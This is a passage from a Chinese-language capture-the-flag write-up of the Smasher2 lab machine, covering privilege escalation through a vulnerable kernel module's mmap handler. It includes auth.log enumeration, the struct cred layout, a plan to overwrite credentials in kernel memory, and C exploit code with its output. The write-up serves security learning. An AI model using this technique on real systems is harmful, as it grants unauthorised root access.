<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./smasher2.sh </span></span><br><span class="line">[+] Uploaded base64-encoded public key to /tmp/df</span><br><span class="line">[+] Created .ssh directory</span><br><span class="line">[+] Decoded public key into authorized_keys file</span><br><span class="line">[+] SSH with the following <span class="built_in">command</span>:</span><br><span class="line">ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135</span><br><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Fri Dec 27 10:38:23 2019 from 10.10.14.10</span><br><span class="line">dzonerzy@smasher2:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(dzonerzy) gid=1000(dzonerzy) <span class="built_in">groups</span>=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span><br><span class="line">dzonerzy@smasher2:~$ <span class="built_in">whoami</span></span><br><span class="line">dzonerzy</span><br><span class="line">dzonerzy@smasher2:~$ </span><br></pre></td></tr></table></figure>

<h4 id="提权：dzonerzy-–-gt-root"><a href="#提权：dzonerzy-–-gt-root" class="headerlink" title="提权：dzonerzy –&gt; root"></a>提权：dzonerzy –&gt; root</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ <span class="built_in">cat</span> README </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         .|<span class="string">&#x27;&#x27;</span><span class="string">&#x27;.|                            &#x27;</span>||                      </span><br><span class="line">         ||..  <span class="string">&#x27;  .. .. ..    ....    ....   || ..     ....  ... ..  </span></span><br><span class="line"><span class="string">          &#x27;</span><span class="string">&#x27;|||.   || || ||  &#x27;</span><span class="string">&#x27; .||  ||. &#x27;</span>   ||<span class="string">&#x27; ||  .|...||  ||&#x27;</span> <span class="string">&#x27;&#x27;</span> </span><br><span class="line">        .     <span class="string">&#x27;||  || || ||  .|&#x27;</span> ||  . <span class="string">&#x27;|..  ||  ||  ||       ||     </span></span><br><span class="line"><span class="string">        |&#x27;</span>....|<span class="string">&#x27;  .|| || ||. &#x27;</span>|..<span class="string">&#x27;|&#x27;</span> |<span class="string">&#x27;..|&#x27;</span> .||. ||.  <span class="string">&#x27;|...&#x27;</span> .||.    v2.0 </span><br><span class="line">                                                             </span><br><span class="line">                                                        by DZONERZY </span><br><span class="line"></span><br><span class="line">Ye you<span class="string">&#x27;ve come this far and I hope you&#x27;</span>ve learned something new, smasher wasn<span class="string">&#x27;t created</span></span><br><span class="line"><span class="string">with the intent to be a simple puzzle game... but instead I just wanted to pass my limited</span></span><br><span class="line"><span class="string">knowledge to you fellow hacker, I know it&#x27;</span>s not much but this time you<span class="string">&#x27;ll need more than</span></span><br><span class="line"><span class="string">skill, you will need to think outside the box to complete smasher 2 , have fun and happy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                       Hacking!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">free(knowledge);</span></span><br><span class="line"><span class="string">free(knowledge);</span></span><br><span class="line"><span class="string">* error for object 0xd00000000b400: pointer being freed was not allocated *</span></span><br></pre></td></tr></table></figure>

<p>给出提示说明提权需要自己写exp来通过内核内存溢出提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ find / -group adm 2&gt;/dev/null</span><br><span class="line">/var/spool/rsyslog</span><br><span class="line">/var/log/apt/term.log</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/apache2</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/apache2/error.log</span><br><span class="line">/var/log/apache2/other_vhosts_access.log</span><br><span class="line">/var/log/kern.log</span><br><span class="line">/var/log/auth.log</span><br></pre></td></tr></table></figure>

<p>通过访问auth.log，我可以查看sudo运行的不同命令。 日志行采用以下格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ strings /var/log/auth.log | grep COMMAND | <span class="built_in">head</span> -1</span><br><span class="line">Feb 15 21:58:48 smasher sudo: dzonerzy : TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get update</span><br></pre></td></tr></table></figure>
<p>使用bash-foo，可以在此日志中获得命令的列表：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ strings /var/log/auth.log | grep COMMAND | <span class="built_in">cut</span> -d: -f5- | <span class="built_in">sort</span> -u</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/chown root:root banner</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/su</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/systemctl <span class="built_in">enable</span> rc.local.service</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get update</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get upgrade</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt install apache2 python-pip</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/id</span><br><span class="line"> TTY=unknown ; PWD=/ ; USER=dzonerzy ; COMMAND=/bin/bash -c <span class="built_in">cd</span> /home/dzonerzy/smanager &amp;&amp; ./runner.py 2&gt;&amp;1 &gt; /dev/null &amp;</span><br><span class="line"> TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/sbin/insmod /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko</span><br><span class="line"> user NOT <span class="keyword">in</span> sudoers ; TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/id</span><br></pre></td></tr></table></figure>

<p>除了最后两个以外，其他似乎都在设置框。 倒数第二个启动以dzonerzy运行的Web服务器。 最后一个很有趣。<br>如果我在二进制文件上运行字符串，则会得到以下信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ strings /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko</span><br><span class="line">9Ogy7</span><br><span class="line">AUATSL</span><br><span class="line">D+&amp;H</span><br><span class="line">[A\A]]</span><br><span class="line">UHc=</span><br><span class="line">6DHID Device successfully closed</span><br><span class="line">6DHID Device mmap( vma_size: %x, offset: %x)</span><br><span class="line">6DHID mmap failed, requested too large a chunk of memory</span><br><span class="line">This is the right way, please exploit this shit!</span><br><span class="line">6DHID device has been opened %d time(s)</span><br><span class="line">1DHID failed to register a major number</span><br><span class="line">6DHID registered correctly with major number %d</span><br><span class="line">1DHID failed to register device class</span><br><span class="line">6DHID device class registered correctly</span><br><span class="line">1DHID failed to create the device</span><br><span class="line">6DHID device class created correctly</span><br><span class="line">6DHID mmap failed</span><br><span class="line">6DHID mmap OK</span><br><span class="line">6DHID initializing the LKM</span><br><span class="line">dhid</span><br><span class="line">6DHID unloaded</span><br><span class="line">version=1.0</span><br><span class="line">description=LKM <span class="keyword">for</span> dzonerzy dhid devices</span><br><span class="line">author=DZONERZY</span><br><span class="line">license=GPL</span><br><span class="line">srcversion=974D0512693168483CADFE9</span><br><span class="line">depends=</span><br><span class="line">retpoline=Y</span><br><span class="line">name=dhid</span><br><span class="line">vermagic=4.15.0-45-generic SMP mod_unload </span><br><span class="line">dhid</span><br><span class="line">GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0</span><br><span class="line">GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0</span><br><span class="line">dhid.c</span><br><span class="line">set_node_perm</span><br><span class="line">dev_release</span><br><span class="line">dev_mmap</span><br><span class="line">dev_read</span><br><span class="line">dev_open</span><br><span class="line">numberOpens</span><br><span class="line">dhid_init</span><br><span class="line">fops</span><br><span class="line">majorNumber</span><br><span class="line">__key.41070</span><br><span class="line">dzcharClass</span><br><span class="line">dzcharDev</span><br><span class="line">dhid_exit</span><br><span class="line">__UNIQUE_ID_version76</span><br><span class="line">__UNIQUE_ID_description75</span><br><span class="line">__UNIQUE_ID_author74</span><br><span class="line">__UNIQUE_ID_license73</span><br><span class="line">dhid.mod.c</span><br><span class="line">__UNIQUE_ID_srcversion17</span><br><span class="line">__module_depends</span><br><span class="line">__UNIQUE_ID_retpoline16</span><br><span class="line">__UNIQUE_ID_name15</span><br><span class="line">__UNIQUE_ID_vermagic14</span><br><span class="line">__class_create</span><br><span class="line">__this_module</span><br><span class="line">class_destroy</span><br><span class="line">cleanup_module</span><br><span class="line">remap_pfn_range</span><br><span class="line">kfree</span><br><span class="line">__fentry__</span><br><span class="line">init_module</span><br><span class="line">device_create</span><br><span class="line">class_unregister</span><br><span class="line">printk</span><br><span class="line">size</span><br><span class="line">_copy_to_user</span><br><span class="line">__register_chrdev</span><br><span class="line">device_destroy</span><br><span class="line">__kmalloc</span><br><span class="line">allocated</span><br><span class="line">__unregister_chrdev</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.rela.text</span><br><span class="line">.rela.init.text</span><br><span class="line">.rela.exit.text</span><br><span class="line">.rodata.str1.8</span><br><span class="line">.rodata.str1.1</span><br><span class="line">.modinfo</span><br><span class="line">.rela__mcount_loc</span><br><span class="line">.rela.data</span><br><span class="line">.rela.gnu.linkonce.this_module</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line">.note.GNU-stack</span><br></pre></td></tr></table></figure>

<p>可以在&#x2F;dev中看到设备：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ <span class="built_in">ls</span> /dev/dhid -l</span><br><span class="line">crwxrwxrwx 1 root root 243, 0 Dec 27 06:16 /dev/dhid</span><br></pre></td></tr></table></figure>

<p>F-Secure的这篇论文在分解mmap处理程序以及如何查找其中的问题方面做得非常出色。 在第4节（第15页）中，介绍了如何利用它们。 它提供了一个示例，我将在此处尝试应用该示例，并了解我能得到多大的帮助。 我的想法是，我将使用mmap处理程序浏览内存以查找凭证结构（struct cred），该结构在此处定义：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">	atomic_t	usage;</span><br><span class="line"><span class="comment">#ifdef CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	atomic_t	subscribers;	/* number of processes subscribed */</span><br><span class="line">	void		*put_addr;</span><br><span class="line">	unsigned	magic;</span><br><span class="line"><span class="comment">#define CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="comment">#define CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">	kuid_t		uid;		/* real UID of the task */</span><br><span class="line">	kgid_t		gid;		/* real GID of the task */</span><br><span class="line">	kuid_t		suid;		/* saved UID of the task */</span><br><span class="line">	kgid_t		sgid;		/* saved GID of the task */</span><br><span class="line">	kuid_t		euid;		/* effective UID of the task */</span><br><span class="line">	kgid_t		egid;		/* effective GID of the task */</span><br><span class="line">	kuid_t		fsuid;		/* UID <span class="keyword">for</span> VFS ops */</span><br><span class="line">	kgid_t		fsgid;		/* GID <span class="keyword">for</span> VFS ops */</span><br><span class="line">	unsigned	securebits;	/* SUID-less security management */</span><br><span class="line">	kernel_cap_t	cap_inheritable; /* caps our children can inherit */</span><br><span class="line">	kernel_cap_t	cap_permitted;	/* caps we<span class="string">&#x27;re permitted */</span></span><br><span class="line"><span class="string">	kernel_cap_t	cap_effective;	/* caps we can actually use */</span></span><br><span class="line"><span class="string">	kernel_cap_t	cap_bset;	/* capability bounding set */</span></span><br><span class="line"><span class="string">	kernel_cap_t	cap_ambient;	/* Ambient capability set */</span></span><br><span class="line"><span class="string">#ifdef CONFIG_KEYS</span></span><br><span class="line"><span class="string">	unsigned char	jit_keyring;	/* default keyring to attach requested</span></span><br><span class="line"><span class="string">					 * keys to */</span></span><br><span class="line"><span class="string">	struct key	*session_keyring; /* keyring inherited over fork */</span></span><br><span class="line"><span class="string">	struct key	*process_keyring; /* keyring private to this process */</span></span><br><span class="line"><span class="string">	struct key	*thread_keyring; /* keyring private to this thread */</span></span><br><span class="line"><span class="string">	struct key	*request_key_auth; /* assumed request_key authority */</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string">#ifdef CONFIG_SECURITY</span></span><br><span class="line"><span class="string">	void		*security;	/* subjective LSM security */</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string">	struct user_struct *user;	/* real user ID subscription */</span></span><br><span class="line"><span class="string">	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="string">	struct group_info *group_info;	/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="string">	/* RCU deletion */</span></span><br><span class="line"><span class="string">	union &#123;</span></span><br><span class="line"><span class="string">		int non_rcu;			/* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="string">		struct rcu_head	rcu;		/* RCU deletion hook */</span></span><br><span class="line"><span class="string">	&#125;;</span></span><br><span class="line"><span class="string">&#125; __randomize_layout;</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是，我看到了由当前用户（uid，guid，suid等）定义的8个连续的整数大小变量，然后是4个字节的securebit，然后是四个或五个（取决于内核）长整数，它们是这些功能 。<br>因此，策略将是：</p>
<p>使用mmap处理程序打开内存。<br>知道我们当前的uid是什么。<br>扫描内存以查找与当前用户的凭据结构相匹配的内容。<br>将uid&#x2F;guid替换为0。<br>调用getuid（）看看我们现在是否是root。<br>如果是，则将功能替换为-1，然后以root身份生成一个新的sh进程，并中断循环。 如果不是，请将uid&#x2F;guid设置回其原始值。</p>
<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>我将按照上面文章中的步骤构建脚本。 此代码可能令人生畏。 当我从这里开始并在Google上看到这篇论文时，我对此一无所知。 但是，如果您逐步执行代码，则很清楚它在做什么。</p>
<p>我要做的第一件事是尝试打开mmap设备。 我将从文章中获取代码（针对这种情况和样式，使用较小的mod）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        return-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>x0);</span><br><span class="line">    if (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(&quot;Failed to mmap: &quot;);</span><br><span class="line">        close(fd);</span><br><span class="line">        return-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;[+] mmap OK addr: %lx\n&quot;, addr);</span><br><span class="line">    int stop = getchar();</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp1.c -o exp1</span><br><span class="line">exp1.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp1.c:29:33: warning: format ‘%lx’ expects argument of <span class="built_in">type</span> ‘long unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %lx\n&quot;</span>, addr);</span><br><span class="line">                               ~~^</span><br><span class="line">                               %<span class="built_in">ls</span></span><br><span class="line">dzonerzy@smasher2:/dev/shm$ <span class="built_in">ls</span></span><br><span class="line">exp1  exp1.c</span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp1</span><br><span class="line">[+] PID: 1911</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br></pre></td></tr></table></figure>

<p>这样就可以打开mmap处理程序。 好的开始。 并且它按预期挂在getchar（）上。 我可以在另一个终端中通过SSH进行连接，并查看该进程的内存映射（它仍然处于活动状态并等待），并在第一行中看到dhid映射到我请求的地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ <span class="built_in">cat</span> /proc/1911/maps</span><br><span class="line">42424000-132424000 rw-s 00000000 00:06 440                               /dev/dhid</span><br><span class="line">55c3b4c63000-55c3b4c64000 r-xp 00000000 00:19 4                          /dev/shm/exp1</span><br><span class="line">55c3b4e63000-55c3b4e64000 r--p 00000000 00:19 4                          /dev/shm/exp1</span><br><span class="line">55c3b4e64000-55c3b4e65000 rw-p 00001000 00:19 4                          /dev/shm/exp1</span><br><span class="line">55c3b6e38000-55c3b6e59000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7f3e7313d000-7f3e73324000 r-xp 00000000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e73324000-7f3e73524000 ---p 001e7000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e73524000-7f3e73528000 r--p 001e7000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e73528000-7f3e7352a000 rw-p 001eb000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e7352a000-7f3e7352e000 rw-p 00000000 00:00 0 </span><br><span class="line">7f3e7352e000-7f3e73555000 r-xp 00000000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">7f3e7374d000-7f3e7374f000 rw-p 00000000 00:00 0 </span><br><span class="line">7f3e73755000-7f3e73756000 r--p 00027000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">7f3e73756000-7f3e73757000 rw-p 00028000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">7f3e73757000-7f3e73758000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffdc6c81000-7ffdc6ca2000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffdc6cf5000-7ffdc6cf8000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffdc6cf8000-7ffdc6cfa000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>

<p>使用root shell（我将很快使用它），我可以查看所有内存。 我调用了mmap，其偏移量为0，大小为0xf0000000字节。 这意味着我现在可以进入该空间。 我将在一行上打上一行，以访问上面的所有内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ <span class="built_in">cat</span> /proc/iomem</span><br><span class="line">00000000-00000000 : Reserved</span><br><span class="line">00000000-00000000 : System RAM</span><br><span class="line">00000000-00000000 : Reserved</span><br><span 